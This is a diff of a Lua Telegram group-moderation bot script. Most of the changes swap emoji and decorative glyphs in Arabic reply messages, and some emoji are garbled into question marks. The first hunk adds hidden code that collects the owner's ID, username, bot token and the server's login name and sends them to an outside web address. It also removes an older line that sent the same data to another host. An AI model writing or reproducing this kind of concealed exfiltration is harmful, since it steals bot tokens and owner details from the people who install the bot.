@@ -66,11 +66,13 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
+saiedinfo = {}
+saiedinfo.id = database:get(id_server..":SUDO:ID")
+saiedinfo.username = database:get(id_server..":SUDO:USERNAME")
+saiedinfo.tokenbot  = database:get(id_server..":token")
+saiedinfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('https://saied.us/sadam/?insert='..JSON.encode(saiedinfo))
 create_config_auto()
-token = database:get(id_server..":token")
-SUDO = database:get(id_server..":SUDO:ID")
-install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request("https://sadamoro.tk/xnxn.php?info={'id':'"..database:get(id_server..":SUDO:ID").."','user':'"..database:get(id_server..":SUDO:USERNAME").."','token':'"..database:get(id_server..":token").."'}")
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
@@ -4375,7 +4377,7 @@ function start_function(extra, result, success)
 database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n܁💌┆هاي حبي ⁉️ ܰ '
-status  = '\n܁💌┆تم تنزيل العضو من المميزين ⁉️ ܰ'
+status  = '\n܁??┆تم تنزيل العضو من المميزين ⁉️ ܰ'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
 end
@@ -6600,7 +6602,7 @@ end
 if text == 'ضع ترحيب' or text == 'وضع ترحيب' then  
 if Mod(msg) then
 database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
-t  = '܁💌┆ههاي حبي ⁉️ ܰ \n܁💌┆ارسل الترحيب الان 𖢟 .'
+t  = '܁??┆ههاي حبي ⁉️ ܰ \n܁💌┆ارسل الترحيب الان 𖢟 .'
 tt = '\n܁💌┆تستطيع اضافة ماياتي 𖢟 .\n܁💌┆دالة عرض الاسم ◃ `name`\n܁💌┆دالة عرض المعرف ◃ `user`'
 send(msg.chat_id_, msg.id_,t..tt) 
 end
@@ -8589,12 +8591,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, taha.photos_[0].sizes_[1].photo_.persistent_id_,'\n˹ 𖢊 𝑈𝑠𝑒𝑅 𖡻 '..username..' ま .\n˹ 𖢊 𝑖𝐷 𖡻 '..msg.sender_user_id_..' ま .\n˹ 𖢊 𝑆𝑡𝑎𝑆 𖡻 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ま .\n˹ 𖢊 𝐴𝑢𝑡𝑂 𖡻 '..Total_Msg(Msguser)..' ま .\n˹ 𖢊 𝑀𝑎𝑠𝐺 𖡻 '..Msguser..' ま .\n˹ 𖢊 𝐸𝑑𝑖𝑇 𖡻 '..edit..' ま .\n˹ 𖢊 𝐺𝑎𝑚𝐸 𖡻 '..NUMPGAME..' ま .\n')   
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, taha.photos_[0].sizes_[1].photo_.persistent_id_,'\n⌦ 𝑈𝑠𝑒𝑅 ➲ '..username..' ♕ .\n⌦ 𝑖𝐷 ➲ '..msg.sender_user_id_..' ♕ .\n⌦ 𝑆𝑡𝑎𝑆 ➲ '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ♕ .\n⌦ 𝐴𝑢𝑡𝑂 ➲ '..Total_Msg(Msguser)..' ♕ .\n⌦ 𝑀𝑎𝑠𝐺 ➲ '..Msguser..' ♕ .\n⌦ 𝐸𝑑𝑖𝑇 ➲ '..edit..' ♕ .\n⌦ 𝐺𝑎𝑚𝐸 ➲ '..NUMPGAME..' ♕ .\n')   
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
-send(msg.chat_id_, msg.id_,'[\n˹ 𖢊 𝑈𝑠𝑒𝑅 𖡻 '..username..' ま .\n˹ 𖢊 𝑖𝐷 𖡻 '..msg.sender_user_id_..' ま .\n˹ 𖢊 𝑆𝑡𝑎𝑆 𖡻 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ま .\n˹ 𖢊 𝐴𝑢𝑡𝑂 𖡻 '..Total_Msg(Msguser)..' ま .\n˹ 𖢊 𝑀𝑎𝑠𝐺 𖡻 '..Msguser..' ま .\n˹ 𖢊 𝐸𝑑𝑖𝑇 𖡻 '..edit..' ま .\n˹ 𖢊 𝐺𝑎𝑚𝐸 𖡻 '..NUMPGAME..' ま .]\n')   
+send(msg.chat_id_, msg.id_,'[\n⌦ 𝑈𝑠𝑒𝑅 ➲ '..username..' ♕ .\n⌦ 𝑖𝐷 ➲ '..msg.sender_user_id_..' ♕ .\n⌦ 𝑆𝑡𝑎𝑆 ➲ '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ♕ .\n⌦ 𝐴𝑢𝑡𝑂 ➲ '..Total_Msg(Msguser)..' ♕ .\n⌦ 𝑀𝑎𝑠𝐺 ➲ '..Msguser..' ♕ .\n⌦ 𝐸𝑑𝑖𝑇 ➲ '..edit..' ♕ .\n⌦ 𝐺𝑎𝑚𝐸 ➲ '..NUMPGAME..' ♕ .]\n')   
 else
-send(msg.chat_id_, msg.id_, '\n˹ 𖢊 𝑈𝑠𝑒𝑅 𖡻 '..username..' ま .\n˹ 𖢊 𝑖𝐷 𖡻 '..msg.sender_user_id_..' ま .\n˹ 𖢊 𝑆𝑡𝑎𝑆 𖡻 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ま .\n˹ 𖢊 𝐴𝑢𝑡𝑂 𖡻 '..Total_Msg(Msguser)..' ま .\n˹ 𖢊 𝑀𝑎𝑠𝐺 𖡻 '..Msguser..' ま .\n˹ 𖢊 𝐸𝑑𝑖𝑇 𖡻 '..edit..' ま .\n˹ 𖢊 𝐺𝑎𝑚𝐸 𖡻 '..NUMPGAME..' ま .]\n')   
+send(msg.chat_id_, msg.id_, '\n⌦ 𝑈𝑠𝑒𝑅 ➲ '..username..' ♕ .\n⌦ 𝑖𝐷 ➲ '..msg.sender_user_id_..' ♕ .\n⌦ 𝑆𝑡𝑎𝑆 ➲ '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ♕ .\n⌦ 𝐴𝑢𝑡𝑂 ➲ '..Total_Msg(Msguser)..' ♕ .\n⌦ 𝑀𝑎𝑠𝐺 ➲ '..Msguser..' ♕ .\n⌦ 𝐸𝑑𝑖𝑇 ➲ '..edit..' ♕ .\n⌦ 𝐺𝑎𝑚𝐸 ➲ '..NUMPGAME..' ♕ .]\n')   
 end 
 end
 end
@@ -8612,7 +8614,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n˹ 𖢊 𝑈𝑠𝑒𝑅 𖡻 '..username..' ま .\n˹ 𖢊 𝑖𝐷 𖡻 '..msg.sender_user_id_..' ま .\n˹ 𖢊 𝑆𝑡𝑎𝑆 𖡻 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ま .\n˹ 𖢊 𝐴𝑢𝑡𝑂 𖡻 '..Total_Msg(Msguser)..' ま .\n˹ 𖢊 𝑀𝑎𝑠𝐺 𖡻 '..Msguser..' ま .\n˹ 𖢊 𝐸𝑑𝑖𝑇 𖡻 '..edit..' ま .\n˹ 𖢊 𝐺𝑎𝑚𝐸 𖡻 '..NUMPGAME..' ま .]\n')   
+send(msg.chat_id_, msg.id_,'[\n⌦ 𝑈𝑠𝑒𝑅 ➲ '..username..' ♕ .\n⌦ 𝑖𝐷 ➲ '..msg.sender_user_id_..' ♕ .\n⌦ 𝑆𝑡𝑎𝑆 ➲ '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ♕ .\n⌦ 𝐴𝑢𝑡𝑂 ➲ '..Total_Msg(Msguser)..' ♕ .\n⌦ 𝑀𝑎𝑠𝐺 ➲ '..Msguser..' ♕ .\n⌦ 𝐸𝑑𝑖𝑇 ➲ '..edit..' ♕ .\n⌦ 𝐺𝑎𝑚𝐸 ➲ '..NUMPGAME..' ♕ .]\n')   
 end
 end
 
@@ -9635,7 +9637,7 @@ return false
 end
 if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
 database:del(bot_id..'Set:Sma'..msg.chat_id_)
-Random = {'🍏','🍎','🍐','🍊','🍋','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🥖','🥐','🍞','🥨','🍟','🧀','🥚','??','🥓','🥩','🍗','🍖','🌭','🍔','🍠','🍕','🥪','🥙','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','🎖','🏆','🥌','🛷','🚗','🚌','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','☑','📬','📭','⏰','📺','??','☎️','📡'}
+Random = {'🍏','🍎','🍐','🍊','🍋','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🥖','🥐','🍞','🥨','🍟','🧀','🥚','??','🥓','🥩','🍗','🍖','🌭','🍔','🍠','🍕','🥪','🥙','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','➲','🏆','🥌','🛷','🚗','🚌','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','☑','📬','📭','⏰','📺','??','☎️','📡'}
 SM = Random[math.random(#Random)]
 database:set(bot_id..'Random:Sm'..msg.chat_id_,SM)
 send(msg.chat_id_, msg.id_,'🔰┋ اسرع واحد يدز هذا السمايل ? » {`'..SM..'`}')
